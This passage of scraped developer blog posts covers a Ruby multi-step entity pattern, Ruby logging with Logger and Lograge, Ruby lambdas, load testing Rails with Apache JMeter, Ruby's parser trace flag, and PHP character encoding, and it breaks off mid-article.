next two steps (and EntityCandidate is smart enough to \"catch up\" if we go multiple steps without saving), you'll see that at the end our profile_candidate is complete: > profile_candidate . email = 'jason@benfranklinlabs.com' => \"jason@benfranklinlabs.com\" > profile_candidate . phone = '(616) 856-8075' => \"(616) 856-8075\" > profile_candidate . save => true > profile_candidate . current_step_number => 3 > profile_candidate . complete? => true The code The code for ProfileCandidate is really simple: class ProfileCandidate < EntityCandidate attr_accessor :first_name , :email , :phone , :creation_process , :completed_steps end EntityCandidate has a little more to it: class EntityCandidate def initialize ( creation_process ) @creation_process = creation_process @completed_steps = [] end def valid? ( step_number = current_step_number ) step = @creation_process . steps [ step_number ] step . valid? ( send ( step . field_name )) end def complete? @completed_steps . length == total_number_of_steps end def last_completed_step_number @completed_steps . last || - 1 end def current_step_number last_completed_step_number + 1 end def total_number_of_steps @creation_process . steps . length end def save if save_step ( current_step_number ) try_saving_any_later_steps true else false end end def save_step ( step_number ) return false unless valid? ( step_number ) @completed_steps << step_number true end def try_saving_any_later_steps step_number = current_step_number while step_number < total_number_of_steps do save_step ( step_number ) step_number += 1 end end end Finally, here are ProfileCreationProcess and ProfileCreationStep : class ProfileCreationProcess attr_accessor :steps def initialize @steps = [] # This validation is *extremely* rudimentary! step :first_name , Proc . new { | first_name | first_name . to_s != \"\" } step :email , Proc . new { | email | email . to_s != \"\" } step :phone , Proc . new { | phone | phone . to_s != \"\" } end def step ( field_name , validator ) @steps << ProfileCreationStep . new ( field_name , validator ) end end class ProfileCreationStep attr_accessor :field_name def initialize ( field_name , validator ) @field_name = field_name @validator = validator end def invalid? ( value ) ! valid? ( value ) end def valid? ( value ) @validator . call ( value ) end end There are, of course, some problems with my implementation I haven't yet devised a way to wire it up to an actual form My validations are comically rudimentary I don't have a way to move backward through the process I don't have a way to save a partially-completed form I don't have a way to save the entity candidate at all So I don't exactly have a gem packaged up and ready to go for you. But I do think the idea is a pretty solid one: build up an entity candidate, then only once we've validated that complete candidate do we swear that candidate into the database—and we do so in a way that appropriately separates our application layers. What do you think? What do you think of this idea? Can you poke holes in it? Is the whole thing stupid? Is it the best idea ever? Would you like to see a gem? Tweet me at @jasonswett or email me at jason@benfranklinlabs.com with your thoughts.", "date": "2014-02-12"},
{"website": "Honey-Badger", "title": "Logging in Ruby with Logger and Lograge", "author": ["Diogo Souza"], "link": "https://www.honeybadger.io/blog/ruby-logger-lograge/", "abstract": "Working with Logs in Ruby Logging is one of the primary tasks an application usually addresses. Logs are used when you need to, for example, see what’s happening inside of your apps, monitor them, or collect metrics for some specific data. When learning a new programming language, the first obvious pick to log information is the native mechanism. It is usually easy, documented, and well-spread throughout the community. Log data varies a lot depending on the company, business, and type of application you’re working with. Therefore, it’s very important to understand how the logging solution you and your team chose will impact its overall use. In this article, we’ll take a ride through the available options of logging for Ruby and Rails, from the built-in ones to the beloved third-party community frameworks. Let’s go! Ruby's Built-In Options Ruby comes with two built-in options to handle logging: printing commands (specially designed for command-line scenarios) and the Logger class. Let’s explore them a little bit. Printing to the Console Ruby has four common ways to print text to the console: puts , print , p , and pp . The puts method prints anything you pass to it, followed by a new line: 2.7.0 :001 > puts \"Hey, I'm a log!\" Hey, I 'm a log!\n => nil The print method is similar to puts , however it always converts arguments to strings using the to_s method. Finally, the p and pp methods will both print the raw object you’re passing to them without performing conversions; the only difference is that the latter formats the output in a more indented way, while the former does not. Application Logs For applications running on servers, it doesn't make sense to print to console. Instead, we use the Logger class, which is much more flexible. Here's how you might use it to print a \"debug\" log: require \"logger\" logger = Logger . new ( STDOUT ) logger . debug ( \"I'm a debug log\" ) We could also configure it to store the logs to a file, or send them to a log aggregator instead of printing to STDOUT if we wanted to. In case you're wondering, \"debug\" is a log level. Log levels let you tell the system \"this log message is related to a certain kind of event.\" There are six built-in log levels: Fatal, Error, Warn, Info, Debug and Unknown. logger . debug ( \"I'm a debug log\" ) logger . info ( \"I'm an info log\" ) logger . warn ( \"I'm a warn log\" ) logger . error ( \"I'm an error log: error message\" ) logger . fatal ( \"I'm a fatal log\" ) When we look at the log output, we see that the log level, process id and timestamp have been appended to each line: Another great feature is the ability to set your Logger object at a specific level: logger . level = Logger :: WARN When you do this, Logger will only handle the logs equal or higher to warn in importance. This is very useful in production, where we may not want to save \"debug\" logs due to size or security reasons. This should be the output: Customizing Your Logs If you want to customize your logs, there’s plenty of options. To change the date and time, for example, just overwrite the default one : logger . datetime_format = \"%Y-%m-%d %H:%M\" Here’s an example of the output: W, [ 2020-07-28 10:50#87786]  WARN -- : I 'm a warn log The date_time format follows the standard specification , so be sure to refer to it when performing such changes. Sometimes, however, you may need to fully modify the format of your logs. For this purpose, Ruby provides the Formatter class. It works by allowing devs to overwrite the default template that Logger uses to print logs. Imagine that your app makes use of a centralized logs analysis tool and needs all of your logs to be printed in the name=value format. This would be the new formatter code: logger . formatter = proc do | severity , datetime , progname , msg | date_format = datetime . strftime ( \"%Y-%m-%d %H:%M:%S\" ) \"date=[ #{ date_format } ] severity= #{ severity . ljust ( 5 ) } pid=# #{ Process . pid } message=' #{ msg } ' \\n \" end Here, we’re making use of a proc to intercept all the logs and change the default way they're printed to the desired one. Now, we have the following result: With just a few lines of code, all of your app logs can now be indexed by the tool. Logging to JSON With the power of Formatter in hand, it’s easy to customize your logs to whatever output type you want. For example, we could use the JSON module to output our logs in that format. require \"json\" logger . formatter = proc do | severity , datetime , progname , msg | date_format = datetime . strftime ( \"%Y-%m-%d %H:%M:%S\" ) JSON . dump ( date: \" #{ date_format } \" , severity :\" #{ severity . ljust ( 5 ) } \" , pid :\"# #{ Process . pid } \" , message: msg ) + \" \\n \" end And, here are the resulting logs: Logging to a File As seen before, the Logger constructor receives, as the first argument, the place where the log should be stored. If you want to save your logs to a file, just say so: require 'logger' logger = Logger . new ( 'my_logs.log' ) This will create a new file my_logs.log in the same folder where your Ruby file containing this code is located: However, the class also allows a bunch of custom options, such as a retention policy config. Take the following example: # Keep data for the current week. Logger . new ( 'my_weekly_logs.log' , 'weekly' ) # Keep data for today and the past 2 months. Logger . new ( 'my_latest_2_months_logs.log' , 2 , 'monthly' ) # Restarts the log over when it exceeds 26GB in size. Logger . new ( 'my_custom_logs.log' , 0 , 20 * 1024 * 1024 * 1024 ) As a second param, Logger accepts a definition of how frequently it should keep the logs or erase them. In the first object, the logs will be kept for one week only. The second will store them for a range of two months, while the latest will analyze just the size of the file (e.g., whenever it reaches 20GB, it’ll be discarded) based on the third param. Logging in Ruby on Rails Most of the benefits of Logger we’ve seen so far can all be used along with Rails apps. The Rails version of Logger is just a simple extension of Ruby’s native class. Apart from that, Rails also adds a nice feature to allow devs to broadcast their logs to multiple loggers. Thus, if you want to work with more than one logging library, you can do so within Rails logger : custom_logger = Logger . new ( STDOUT ) Rails . logger . extend ( ActiveSupport :: Logger . broadcast ( custom_logger )) This can also be useful when you need some intelligence regarding the places your logs should go. Some parts of your app may need logs in different locations or different formats. Choosing a Third-party Logging Framework If Ruby's built-in logger doesn't do exactly what you need, you have options. There are plenty of options when it comes to picking up a 3rd-party logging framework. The most popular of these is Lograge . Let's take a look at it! First Steps with Lograge Lograge was made for Rails apps. If you’re working with vanilla Ruby, it may not be a good choice. To install it, just add the following gem: bundle add lograge Then, create a new config file at config/initializers/lograge.rb with the following code: Rails . application . configure do config . lograge . enabled = true config . lograge . custom_options = lambda do | event | { time: event . time } end end This config enables Lograge and defines the time that a log, considered an event to the framework, has to be printed. When you start the Rails app and access the first endpoint, Lograge will print the request summary. Comparing the logs before and after Lograge setup, respectively, results in something like shown below: Again, Lograge is not a silver bullet; it is actually a very opinionated framework. So, you’ll probably need to use it along with the built-in Logger (or other frameworks of your preference). Wrapping Up In the end, it becomes clearer that logging is not only a crucial part of your projects but also very underestimated. To better understand the tools you’re using, regardless of whether they are native, will help you to achieve better results too. Be sure to always conduct a lot of testing to adopting a new framework. Sometimes your platform already comes bundled with great built-in options. If that’s not the case, determine whether it allows the use of other frameworks integrated with the one that’s already inside. Best of luck!", "date": "2021-03-08"},
{"website": "Honey-Badger", "title": "Using Lambdas in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/using-lambdas-in-ruby/", "abstract": "Blocks are such an important part of Ruby, it's hard to imagine the language without them. But lambdas? Who loves lambdas? You could go years without using one. They almost seem like a relic from a bygone age. ...But that's not quite true. Lambdas have some interesting tricks up their sleeves once you investigate them a little. In this article we'll start with the basics of lambda usage, and then move on to some more interesting advanced usages. So if you use lambdas every day and know all about them, just scroll down. The main thing to remember about Lambdas is that they act like functions. Blocks and Procs have their uses. But neither of them behaves 100% like a real life function. Lambdas do.  Let's go down the list. Lambdas enforce the correct number of arguments Unlike Procs, lambdas enforce the correct number of arguments Lambdas support default arguments In the example below, we create a lambda function with a default argument value of \"hello world\" Lambdas support default arguments The return keyword works exactly how you'd expect. Maybe this sounds like a small thing, but if you've ever tried to use return inside of a proc you know it's not. The example below will show you what I mean. I've defined a method called something that calls a Proc . The Proc has a return statement. But that return statement is tricky. Instead of just returning from the proc, it returns from the something method. But when I do something similar with lambda , the return statement just returns from the lambda. It's just like any other function. When you use the return keyword inside of the lambda, it returns from the lambda Lambdas are closures To quote a great stack overflow post: The most simple way to think of a closure is a **function that can be stored as a variable** (referred to as a \"first-class function\"), that has a special ability to access other variables local to the scope it was created in. What does it mean to be able to access other variables local to the scope the lambda was created in? Let's take a look. In the example below I've created a local variable named marco . I can use that variable inside of my lambda. And if I change the value in that variable, the lambda sees the new value. Ruby lambdas are closures Lambdas are chameleons One of the truly weird things about lambdas is the variety of ways we can call them. The sample below shows three ways to invoke a lambda. They're all equivalent. There are at least three ways to invoke a lambda in Ruby Perhaps this seems a little odd to you. It did to me at first. And to be honest the l.(arg) syntax still baffles me. But the l[arg] syntax is pretty interesting. It means that to a limited extent you can use lambdas in places where you'd normally use an array or a hash. Using lambdas as computed hashes and arrays Imagine that you have a test suite. As part of the initialization, you need to create fake Person records. It's simple. You just create a new FakePerson record and pass in a first name and a last name. But what if you want to \"fuzz test\" the system by using different first and last names every time the test is run? One way to do this might be to pass in a lambda function instead of a hash . In this example, I use a lambda function to generate fake names via the excellent Faker gem. Here, the lambda pretends to be a hash. Lambdas have built-in currying Currying is a cool technique used a lot in functional programming. It's a way to let you create new functions from existing functions. It's easy to understand when you see it in practice. In the code below I have a lambda function that adds two numbers. Conveniently, it's called add. Then I use currying to create a more specialized function called increment. It simply adds one to any given number. You can curry any proc in Ruby Lambdas are a special kind of Proc You may have noticed that in all the code samples, whenever I've defined a lambda function, I get a Proc in return. That's because Ruby implements lambdas as a kind of Proc. So a lot of the things I've shown you in this article can be done with Procs as well as lambdas. Stabby Lambdas In this article I've used the lambda keyword for clarity. But there's a more concise syntax for defining lambdas introduced in Ruby 1.9 and known as the \"stabby lambda.\" Here's how it works: Ruby's stabby lambda syntax was introduced in version 1.9", "date": "2015-06-16"},
{"website": "Honey-Badger", "title": "Load Test Your Rails Apps with Apache JMeter", "author": ["Milap Neupane"], "link": "https://www.honeybadger.io/blog/rails-load-testing-jmeter/", "abstract": "Before we release our software to the end-users, we perform different kinds of tests to ensure that the application is bug-free and meets business requirements. Although we do a lot of testing, we cannot be sure the software is stable without users actually using it. After end-users start using the application, various things can cause the application to not behave as we expect, for some of the following reasons: User behavior can be unpredictable; Users are distributed across different locations; A large number of users could be using the application at the same time. For large-scale applications, these things are very crucial to know before a full-fledged release. To ensure that our application works as expected, we need to consider a few things while rolling out its functionality: Phased rollout -\nDuring a phased rollout, the application can be tested by a small portion of users before everyone gets access to the functionality. This will help us determine user behavior. Load testing -\nDuring a phased rollout, we can determine user behavior, but we cannot know how the platform works when many users utilize the application at the same time from different locations What Is Load Testing, and How Is It Different From Performance Testing? The following three terms may sound similar, but they are different: Performance Testing, Load Testing, and Stress Testing. Performance Testing is a general testing mechanism used to assess how the application performs with a given input. This could be done with a single-user using the application or with multiple users. It is conducted to assess certain metrics, such as response time and CPU/memory usage. Load/stress testing is a subset of performance testing. Load Testing is conducted to ensure the application performs as expected with a specified number of users using the application concurrently over a specified length of time. It helps in determining how many users a system can handle. Stress Testing and load testing are closely related to each other. Stress testing can be done with a similar mechanism as load testing, but the goal of testing is different. The goal of load testing is to determine whether our application works with the specified number of users, whereas stress testing is conducted to determine how the application behaves and handles failure after the load limit is hit. Based on the ramp-up period, performance testing can be categorized as either a spike test or a soak test . A sudden spike in users over a short length of time is a spike test, and a slow ramp-up of users over a longer duration is a soak test. Why Is Performance Testing Important? On one of the Rails projects, we were anticipating a lot of growth in users in the near future. We wanted to ensure that the application performed as expected, and crucial functionality was not lost with the increased number of users. So, how do we ensure this? We performed a load test and checked whether the application could handle the given increase in users.\nPerformance testing can be important in many other cases: If the application is expected to have a spike in users on a specific day, such as a black Friday, spike testing the application with a brief ramp-up period can help us find potential issues in the system. Load testing helps identify bugs in the system that are not visible or are very minimal when only a few users are using it. It allows us to evaluate how the platform's speed is impacted by an increased load. If the application is slow, we could lose customers. It helps to assess how our system works under an increased load and if the system crashes with high CPU or memory usage when there are 10,000 users. The cost of running the application for a specific number of users can be determined with load testing. We were able to find a bug in our Rails app while performing a load test. I will describe a similar scenario where we identified an issue. A hotel booking app had an open booking process, and when only a few users were trying to book a room, everything was fine. However, when multiple users were trying to book the same room, two different users were able to book it successfully. By load testing our app, we were able to identify the problem and fix it at an early stage, before releasing the feature. Using Apache JMeter to Load Test a Rails App JMeter is an Apache 2.0-licensed open-source load testing tool. It provides thread-based load testing. With thread-based testing, we can easily simulate the stress our system would be under when a lot of users use our application simultaneously. JMeter also provides good reporting of the test results. We will look into how we can use Apache JMeter to perform load tests to identify potential issues with the system and the response time of our application by simulating a lot of users using our system. JMeter can be downloaded from the following link: http://jmeter.apache.org/download_jmeter.cgi#binaries Some JMeter Terminologies To Be Familiar With Test Plan Test plan is the top-level thing inside, which we define as the load testing components. Global configs and variables are defined here. Thread Group is used to define threads and configs, such as the numbers of threads, ramp-up periods, the delay between threads, and loops. This can be treated as the number of parallel users you want to run the load test with. Sampler is what a single thread executes. There are different types of samplers, such as HTTP requests, SMTP requests, or TCP requests. Pre/Post Processor is used to execute something before or after the sampler runs. Post-processors can take in response data from one API call and pass it along for use on the next one. Listener listens to the response from the sampler and provides aggregated reports of the response time or response from each thread. Assertion can be useful to validate that the response data are what we expected from the sampler. Config Element defines configurations, such as the HTTP header, HTTP cookies, or CSV dataset configurations. To run a load test, we need to first create a JMX file where we define the above-described JMeter terminologies. Preparing a JMX File for a Load Test JMX is a JMeter project file written in XML format. Writing a JMX file manually can be difficult, so we will use the JMeter interface to create the file. Open the JMeter interface and locate the test plan. Inside the test plan, we will add threads and its load test configurations. JMeter interface for creating test plans The test plan can be renamed according to what we are load testing for. We can configure a thread group(Users). You can keep the default settings here and move on to create the threads group. Add -> Threads(Users) -> Thread Group In the thread group, by default, there will be a single thread specified. Change the number as needed to simulate the number of users accessing the app. Since we will load test a web-based Rails app, we will add an HTTP sampler. We can add a sampler, which will be inside a ThreadGroup . Add an HTTP Sampler by navigating the following: Add -> Sampler -> HTTP Request Here, we configure the IP or the domain that we are load testing on and the HTTP method and any request body required for the HTTP endpoint. Finally, to view the report of the load test, we can add a listener to the thread group. Add -> Listener -> View Result Tree The view result tree will display the response time of each thread. We can add other kinds of reports here as well. 'View result tree' should only be used for debugging proposes and not for actual testing. In this way, we can create a simple test plan and execute it. Simply hit the play icon in the top bar of the JMeter to execute the test. Things to Consider Before Load Testing a Rails App The above example is a very simple, single endpoint HTTP request. In the case of our Rails app, the endpoints we want to test are locked with authentication. Therefore, we need to ensure that we have the following things in place: Web cookie - The HTTP endpoints need to have a cookie header before we can perform the load test on them. JMeter provides functionality to add the cookie once a user is logged in. In the next section, we will look into how we can record the browser request and convert it to a JMX file for our load test. We will also cover cookie recording. Rails CSRF token - Rails protects the app from security vulnerability by providing a CSRF token, so we need to ensure that our request has the CSRF authentication in the header before performing the load test. This CSRF token is present in the header inside a meta tag in the HTML. Rails CSRF Token can be fetched in JMeter by using a post-processor. Right-click on the HTTP Request that loads the web page containing the CSRF token, and then select Add -> Post Processor -> Regular Expression Extractor . Here, you can add the following regular expression extractor configs to read the CSRF value from the header meta tag: Reference Name: csrf_value Regular Expression: name=\"csrfToken\" content=\"(.+?)\" Template: $1$ Match No: 1 Now, the variable csrf_value can be used to make the request. Recording Requests From the Browser to Create a JMX File With fewer HTTP endpoints, it can be simple to create a JMX file from the JMeter interface. However, for a larger test case, this can be difficult. Also, there is a chance we could miss actual requests made while a user uses the application. We want the actual requests made from the browser to be recorded and the JMX file created automatically. JMeter can be added as a proxy between the Rails app and browser. With this, all the requests will be forwarded to the Rails server by JMeter. This is also called a MITM(man in the middle) attack. JMeter Recording To create a recording in JMeter, go to file -> templates -> recording and click create. Specify the hostname you are recording. This will automatically generate a few things for you, including the cookie manager. The cookie manager will save the cookie required for authentication. Verifying HTTPs Requests With a JMeter SSL Certificate This request we make from the browser will be forwarded to JMeter, and JMeter will forward it to the web service and record the requests so that we can run the load test from the JMeter recording. If the application requires an https protocol for SSL connections, then a certificate needs to be added to the browser. To add the certificate, let us open Firefox or any other browser. In Firefox, Go to settings > Privacy > Manage certificate and add the JMeter certificate so that the browser will recognize the certificate generated by JMeter. Enter cmd + sht + g and enter path /usr/local/Cellar/jmeter/5.2/libexec/bin/jmeter to add the certificate Configure Firefox to Use JMeter as Aa Proxy Next, we need to forward the request from Firefox to our JMeter recording script. This can be done by configuring the proxy in Firefox. Open Firefox and go to Preferences -> Advanced -> Connection(settings) . Here, set the HTTP Proxy to \"localhost\" and the port to \"8080\" and check \"Use this proxy server for all protocols\". Now, we can go to JMeter and the Script recording section from the template we chose earlier. Once we hit the start button, JMeter begins accepting the incoming requests. When we go to Firefox and browse the application we are load testing, this will record and convert it to a JMX file, which we can run for load testing. Distributed Load Testing With JMeter While running the test, we can perform a test from one of our local machines. Doing this is okay when preparing the test plan, but when running the actual test, we need to change it. Performing load tests on a single machine will have hardware limitations (i.e., CPU and memory) and request location limitations. These tests are run to simulate the traffic of actual users using the application. For this purpose, we need to distribute the tests to different servers and have a single place to view all the results. JMeter provides a primary node for orchestrating the test and multiple secondary nodes for running the test. This helps to simulate real users using the application. We can distribute the testing servers to different regions close to our actual users. JMeter Distributed testing To perform a distributed test, begin by installing JMeter on both the primary and secondary servers. Things to do on the secondary server: Go to jmeter/bin and execute the jmeter-server command. This will start the server to execute the test. If any CSV input is needed for the test, add these files to this server. Things to do on the primary server: Go to the jmeter/bin directory and open the jmeter.properties file. Edit the line containing remote_hosts and add the IPs of secondary servers, separated by commas remote_hosts=<s1_ip>,<s2_ip> . Run the JMeter test. The secondary server will be responsible for running the actual test, and the primary server will aggregate the reports. To perform the load testing, we should always use the CLI command instead of triggering the test from the UI, as this can cause performance problems for the load testing servers. We can use the JMeter command specifying the JMX filename: > jmeter -n -t path/to/test.jxm -r OR > jmeter -n -t path/to/test.jxm -R s1_ip,s2_ip,… -r uses the remote server specified in the jmeter.properties -n will run it without the GUI mod -t path to the jmx file How We Decided on Using Puma vs. Unicorn for Our Rails Server Puma and Unicorn are two different web servers for Rails. Both have benefits, so how do we decide which is best? It depends on the application. Some applications work best with Unicorn, and some work best with Puma. We had to choose between Unicorn and Puma for one of our Rails apps, and we did so based on data obtained from load testing. We performed a load test on the Rails app once with Unicorn and the other time using Puma. The only thing that we changed was the web server on the Rails app. We got the following result from this test: Response time different between puma and unicorn We found that Puma performs better for our Rails app when there is a large number of users on the platform. This means we will be able to handle more users with a fewer number of application servers. Note: This depends on the type of server instance you are using and what kind of business logic processing the app performs. Some Common Failures Encountered While Stressing the Rails App and How to Remedy Them Unoptimized database query Eliminate the n+1 query problem. Add an index according to the access pattern. Use a Redis-like caching layer in front of the database. Slow ruby code performance Memoize to optimize the code. Figure out the o(n^2) complexity and use optimal algorithms. In micro-service architectures, there can be a lot of HTTP calls between services. Network calls are slow. Reduce the number of HTTP calls by using a messaging system for microservices. The same record is created twice when created concurrently. Add a database-unique constraint. Utilize FIFO event(queue)-based resource creation. Use background processing, such as Sidekiq, whenever possible. Define an SLA for API response times and include performance testing as a part of the development lifecycle. Which Environment Should Be Used to Perform Load Testing? Performing a load test in a production environment is not an ideal choice because it could cause issues and even downtime in production. We do not want to create problems in the production environment, but we still want to ensure that the test report reflects true data, similar to production. For load/stress tests, it is recommended to make a replica environment of production. This includes things like the following: The number of application servers. The database server's hardware specifications, including replicas. Production-like data in the testing database. This should include a nearly equal data volume as encountered in production. Creating a production-like environment can be challenging and costly. So, based on what we are load testing, the infrastructure touching those components only can be upgraded to production-like. It saves cost. It is better to load/stress test your app once every three months. However, performance testing with a single user and validating that the response time is under the defined standard (something like 200m) is something that we need to add to the development cycle. While load testing, we also need data-points, such as CPU/memory usage of the target server. A spike in memory/CPU usage can cause the application to crash. To measure hardware KPIs, add monitoring tools, such as Prometheus , before starting the load test. Apache JMeter is a powerful tool for load testing. We used Apache JMeter for load testing Rails apps, but it can be used to perform load/stress testing of an application build on any stack. Load testing helps make data-powered decisions in the application. Load testing can sound scary, but with a little investment in the beginning, it can add a lot of stability and reliability to the application in the long-term.", "date": "2020-12-16"},
{"website": "Honey-Badger", "title": "Watch Ruby as it parses your code", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/watch-ruby-as-it-parses-your-code/", "abstract": "I thought it would be fun to take a break from practical, useful content to show you a neat Ruby party trick. Before Ruby runs your program it has to parse it. The parser is a kind of a state machine. And there is a little-known command line flag that you can use to make Ruby log everything the state machine does. Take the following example: a = 1 + 2 If I run this using the -y flag, I get the following output: $ ruby -y sample.rb\nStarting parse\nEntering state 0\nReducing stack by rule 1 (line 903):\n-> $$ = nterm $@1 ()\nStack now 0\nEntering state 2\nReading a token: Next token is token tIDENTIFIER ()\nShifting token tIDENTIFIER ()\nEntering state 35\nReading a token: Next token is token '=' ()\nReducing stack by rule 509 (line 4417):\n   $1 = token tIDENTIFIER ()\n-> $$ = nterm user_variable ()\nStack now 0 2\nEntering state 113\nNext token is token '=' ()\nReducing stack by rule 100 (line 1764):\n   $1 = nterm user_variable ()\n-> $$ = nterm lhs ()\nStack now 0 2\n...\n140 more lines What we're seeing here is the Ruby parser cycling through each token in the file and performing the following operations: Add the token to a stack Compare the stack to a list of rules If the token matches a rule, do a state transition If no match, add another token to the stack and try again. All of the states and rules are defined in parse.y a file that is processed by the bison parser generator to generate the actual parser which is in C.", "date": "2015-11-30"},
{"website": "Honey-Badger", "title": "Character Encoding for PHP Developers: Unicode, UTF-8 and ASCII", "author": ["José M. Gilgado"], "link": "https://www.honeybadger.io/blog/php-character-encoding-unicode-utf8-ascii/", "abstract": "Your PHP project probably involves dealing with lots of data coming from different places, such as the database or an API, and every time you need to process it, you may run into an encoding issue. This article will help you prepare for when that happens and better understand what's going on behind the scenes. An introduction to encoding Encoding is at the core of any programming language, and usually, we take it for granted. Everything works until it doesn't, and we get an ugly error, such as \"Malformed UTF-8 characters, possibly incorrectly encoded\". To find out why something in the encoding might not work, we first need to understand what we mean by encoding and how it works. Morse code Morse code is a great way to explain what encoding is about. When it was developed, it was one of the first times in history that a message could be encoded, sent, and then decoded and understood by the receiver. If we used Morse code to transmit a message, we'd first need to transform our message into dots and dashes (also called short and long marks), the only two signals available in this method. Once the message reaches its destination, the receiver needs to transform it from Morse code to English. It looks something like this: \"Hi\" -> Encode(\"Hi\") -> Send(\".... ..\") -> Decode(\".... ..\") -> \"Hi\" This system was invented around 1837, and people manually encoded and decoded the messages. For example, S is encoded as ... (three short marks) T as - (one long mark) U as ..- (two short marks and one long mark) Here's a radio operator encoding in Morse code: On the Titanic, Morse code was used to send and receive messages, including the last one where they were asking for help (\"CQD\" is a distress call). SOS SOS CQD CQD Titanic. We are sinking fast. Passengers are being put into boats. Titanic In computer encoding, computers encode and decode characters in a very similar way. The only difference is that instead of dots and dashes, we have ones and zeros in a binary code. Binary and characters As you probably know, computers only understand binary code in 1s and 0s, so there's no such thing as a character. It's interpreted by the software you use. To encode and decode characters into 1s and 0s, we need a standard way to do it so that if I send you a bunch of 1s and 0s, you will interpret them (decode them) in the same way I've encoded them. Imagine what would happen if each computer translated binary code into characters and vice-versa in its own way. If you sent a message to a friend, they couldn't see your real message because, for their computer, your 1s and 0s would mean something else. This is why we need to agree on how we transform the characters into binary code and vice-versa; we need a standard. Standards Encoding standards have a long history. We don't need to fully explore the history here, but it's essential to know two significant milestones that defined how computers can use encoding, especially with the birth of the Internet. ASCII ASCII, developed in 1963, is one of the first and most important standards, and it is still in use (we'll explain this later). ASCII stands for American Standard Code for Information Interchange. The \"American\" part is very relevant since it could only encode 127 characters in its first version, including the English alphabet and some basic symbols, such as \"?\" and \";\". Here's the full table: Source Computers can't really use numbers. As we already know, computers only understand binary code, 1s and 0s, so these values were then encoded into binary. For example, \"K\" is 75 in ASCII, so we can transform it into binary by dividing 75 by 2 and continue until we get 0. If the division is not exact, we add 1 as a remainder: 75 / 2 = 37 + 1\n37 / 2 = 18 + 1\n18 / 2 =  9 + 0\n9 / 2 =   4 + 1\n4 / 2 =   2 + 0\n2 / 2 =   1 + 0\n1 / 2 =   0 + 1 Now, we extract the \"remainders\" and put in them in inverse order: 1101001 => 1001011 So, in ASCII, \"K\" is encoded as 1001011 in binary. The main problem with ASCII was that it didn't cover other languages. If you wanted to use your computer in Russian or Japanese, you needed a different encoding standard, which would not be compatible with ASCII. Have you ever seen symbols like \"???\" or \"Ã,ÂÃƒâ€šÃ‚Â\" in your text? They’re caused by an encoding problem. The program tries to interpret the characters using one encoding method, but they don't represent anything meaningful since it was created with another encoding method. This is why we needed our second big breakthrough, Unicode and UTF-8. Unicode The goal in developing Unicode was to have a unique way to transform any character or symbol in any language in the world into a unique number, nothing more. If you go to unicode.org , you can look up the number for any character, including emojis! For example, \"A\" is 65, \"Y\" is 121, and 🍐 is 127824. The problem is that computers can only store and deal with binary code, so we still need to transform these numbers. A variety of encoding systems can achieve this feat, but we'll focus on the most common one today: UTF-8. UTF-8 UTF-8 makes the Unicode standard usable by giving us an efficient way to transform numbers into binary code. In many cases, it's the default encoding for many programming languages and websites for two crucial reasons: UTF-8 (and Unicode) are compatible with ASCII. When UTF-8 was created in 1993, a lot of data was in ASCII, so by making UTF-8 compatible with it, people didn't need to transform the data before using it. Essentially, a file in ASCII can be treated as UTF-8, and it just works! UTF-8 is efficient. When we store or send characters through computers, it's important that they don't take up too much space. Who wants a 1 GB file when you can have a 256 MB one? Let's explore how UTF-8 works a bit further and why it has different lengths depending on the character being encoded. How is UTF-8 efficient? UTF-8 stores the numbers in a dynamic way. The first ones in the Unicode list take 1 byte, but the last ones can take up to 4 bytes, so if you're dealing with an English file, most characters are likely only taking 1 byte, the same as in ASCII. This works by covering different ranges in the Unicode spectrum with a different number of bytes. For example, to encode any character in the original ASCII table (from 0 to 127 in decimals), we only need 7 bits since 2^7 = 128. Therefore, we can store everything in 1 byte of 8 bits, and we still have one free. For the next range (from 128 to 2047), we need 11 bits since 2^11 = 2,048, which is 2 bytes in UTF-8, with some permanent bits to give us some clues. Let's take a look at the full table, and you'll see what I mean: When reading 1s and 0s in a computer, we don't have the concept of space between them, so we need a way to say, \"here comes this kind of value\", or \"read x bits now\". In UTF-8, we achieve this by strategically placing some 1s and 0s. If you're a computer and read something that starts with 0 in UTF-8, you know that you only need to read 1 byte and show the right character from Unicode in the range of 0-127. If you encounter two 1s together, it means you need to read two bytes, and you're in the range of 128-2,047. Three 1s together means that you need to read three bytes. Let's see a couple of examples: A character (such as \"A\") is translated into a number according to the giant Unicode table (\"65\"). Then, UTF-8 transforms this number into binary code (01000001) following the pattern we've shown. If we have a character in a higher range, such as the emoji \"⚡\", which is 9889 according to Unicode, we need 3 bytes: 11100010 10011010 10100001 We can also show how this works with PHP just for fun: // We first extract the hexadecimal value of a string, like \"A\" $value = unpack ( 'H*' , \"A\" ); // Convert it now from hexadecimal to decimal (just a number) $unicodeValue = base_convert ( $value [ 1 ], 16 , 10 ); // $unicodeValue is 65 // Now we transform it from base 10 (decimal) to base 2 (binary) echo base_convert ( $unicodeValue , 10 , 2 ); // 1000001 Encoding in PHP Now that we've taken a look at how encoding works in general, we can focus on the essential parts that we usually need to handle in PHP. A quick note on PHP versions As you probably know, PHP has had a bad reputation for quite some time. However, thankfully, many of its original flaws were fixed in the more recent versions (from 5.X). Therefore, I recommend that you use the most modern version you can to prevent any unexpected problems. Where encoding matters in PHP There are usually three places where encoding matters in a program: The source code files for your program. The input you receive. The output you show or store in a database. Setting the right default encoding Since UTF-8 is so universal, it's a good idea to set it as the default encoding for PHP. This encoding is set by default, but if someone has changed this setting, here's how to do it. Go to your php.ini file and add (or update) the following line: default_charset = \"UTF-8\" What happens when a string coming in uses a different encoding? Let's see what to do in this case. Detecting encoding When we receive a string from reading a file, for example, or in a database, we don't know the encoding, so the first step is to detect it. Detecting a specific encoding isn't always possible, but we have a good chance with mb_detect_encoding . To use it, we need to pass the string, a list of valid encodings that you expect to detect, and whether you want a strict comparison (recommended in most cases). Here's an example of a way to determine whether a string is in UTF-8: mb_detect_encoding ( $string , 'UTF-8' , true ); With a list of potential encodings, we could pass a string or an array: mb_detect_encoding ( $string , \"JIS, eucjp-win, sjis-win\" , true ); $array [] = \"ASCII\" ; $array [] = \"JIS\" ; $array [] = \"EUC-JP\" ; mb_detect_encoding ( $string , $array , true ); This function will return the detected character encoding or false if it cannot detect the encoding. Convert to a different encoding Once it's clear which encoding we're dealing with, the next step is transforming it to our default encoding, usually UTF-8. Now, this is not always possible since some encodings are not compatible, but we can try the following approach: // Convert EUC-JP to UTF-8 $string = mb_convert_encoding ( $stringInEUCJP , \"UTF-8\" , \"EUC-JP\" ); If we want to auto-detect the encoding from a list, we can use the following: // Auto detect encoding from JIS, 